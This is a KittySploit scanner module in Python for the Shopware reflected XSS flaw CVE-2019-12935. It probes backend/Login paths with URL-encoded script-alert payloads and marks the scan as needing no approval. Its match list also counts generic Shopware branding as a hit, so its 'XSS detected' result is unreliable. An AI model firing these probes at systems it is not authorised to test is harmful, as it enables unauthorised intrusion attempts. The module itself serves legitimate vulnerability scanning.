#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Shopware before 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Shopware < 5.5.8 - Cross-Site Scripting Detection',
        'description': "Shopware before 5.5.8 contains a reflected cross-site scripting (XSS) caused by unsanitized query string parameters in the backend/Login or backend/Login/load/ URI, letting attackers execute arbitrary scripts in the context of the victim's browser, exploit requires sending crafted URL to the victim.",
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'shopware', 'xss'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 4,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.miggo.io/vulnerability-database/cve/CVE-2019-12935',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-12935',
        ],
        'cve': 'CVE-2019-12935',
    }

    def run(self):
        for path in ('/admin', '/backend', '/backend/Login?error=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/backend/Login/load/?param=%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code not in (200, 401):
                continue
            body = r.text or ""
            body_any = ('Realisiert mit Shopware', 'Realised with Shopware', 'Shopware Administration (c) shopware AG', '<title>Shopware 5 - Backend (c) shopware AG</title>', 'Shopware.Application.start', '<script>alert(document.domain)</script>',)
            if (any(m in body for m in body_any)):
                self.set_info(
                    severity='high',
                    reason="Shopware < 5.5.8 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

